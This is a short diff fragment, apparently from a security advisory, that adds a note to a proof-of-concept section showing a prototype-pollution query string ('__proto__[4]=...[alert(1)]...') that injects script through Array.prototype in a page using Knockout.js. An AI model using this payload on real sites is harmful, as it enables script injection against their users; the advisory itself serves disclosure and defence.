@@ -29,6 +29,8 @@ https://github.com/knockout/knockout/blob/9893233413e467a40919237e524b545e335c10
 
 ### PoC
 
+* Can be exploited through Array.prototype
+
 ```
 ?__proto__[4]=a':1,[alert(1)]:1,'b&__proto__[5]=,
 ```
